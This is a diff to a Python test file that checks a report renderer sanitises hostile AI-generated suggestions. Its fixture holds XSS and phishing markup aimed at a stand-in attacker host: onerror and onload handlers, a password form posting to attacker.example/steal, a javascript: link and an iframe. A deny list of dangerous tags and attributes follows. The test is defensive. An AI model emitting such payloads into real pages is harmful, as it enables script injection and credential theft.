@@ -139,10 +139,43 @@ def test_back_to_top_links_removed_find_in_page_note_kept():
 # Invariant self-contained / offline-safe
 # --------------------------------------------------------------------------
 
+_HOSTILE_SUGGESTION = (
+	"**Diagnosis**\n\n"
+	"![pixel](https://attacker.example/p.png)\n\n"
+	'<img src="https://attacker.example/i.png" onerror="alert(1)">\n\n'
+	'<form action="https://attacker.example/steal"><input type="password" name="pw"></form>\n\n'
+	'<div style="position:fixed;top:0;left:0">overlay</div>\n\n'
+	"[click here](https://attacker.example/phish)\n\n"
+	"[docs](https://attacker.example\\@docs.frappe.io/x)\n\n"
+	"[js](javascript:alert(1))\n\n"
+	'<iframe src="https://attacker.example/f"></iframe>\n\n'
+	'<svg onload="alert(1)"></svg>\n\n'
+	"<style>body{display:none}</style>\n\n"
+	"See [the docs](https://frappeframework.com) for more.\n\n"
+	"```diff\n- a = 1\n+ a = 2\n```\n"
+)
+
+
 def test_report_is_self_contained_offline():
+	# A distinct callsite and type so root-cause grouping never folds it into
+	# the first finding's card.
+	hostile = _finding(
+		finding_type="Slow Query",
+		title="Hostile AI output",
+		technical_detail_json=json.dumps({"callsite": {
+			"filename": "/abs/myapp/bar.py", "lineno": 77, "function": "other",
+			"source_snippet": [{"lineno": 77, "content": "rows = frappe.db.sql(q)"}],
+		}}),
+		llm_fix_json=json.dumps({
+			"suggestion": _HOSTILE_SUGGESTION,
+			"model": '<img src="https://attacker.example/m.png">',
+			"provider": "x",
+			"generated_at": "t",
+		}),
+	)
 	html = _render(findings=[_finding(llm_fix_json=json.dumps({
 		"suggestion": "Batch it.", "model": "m", "provider": "x", "generated_at": "t",
-	}))])
+	})), hostile])
 	# No scripts / JS at all.
 	assert "<script" not in html.lower()
 	# No external RESOURCE loads (these would fetch over the network). Inline
@@ -154,3 +187,14 @@ def test_report_is_self_contained_offline():
 	# Anchor links (e.g. aerele.in) ARE allowed sanity-check one exists so the
 	# checks above aren't trivially passing on an empty page.
 	assert re.search(r'<a [^>]*href="https?://', html)
+	# P8 output: AI blocks carry no remote fetch, form, style or script.
+	bodies = re.findall(r'<div class="fix-body">(.*?)</div>\s*<div class="fix-foot">', html, re.S)
+	assert any("<strong>Diagnosis</strong>" in body for body in bodies)  # the hostile card rendered
+	for body in bodies:
+		low = body.lower()
+		for bad in ("<img", "<form", "<input", "<iframe", "<svg", "<style", "style=", "javascript:", "onerror", "onload", "src="):
+			assert bad not in low, bad
+		assert "attacker.example" not in low
+	assert "dh-add" in html  # diff colouring survived the strict allowlist
+	assert '<img src="https://attacker' not in html  # the model name is escaped too (Jinja autoescape)
+	assert 'href="https://frappeframework.com"' in html  # a legitimate doc link still renders as a live link
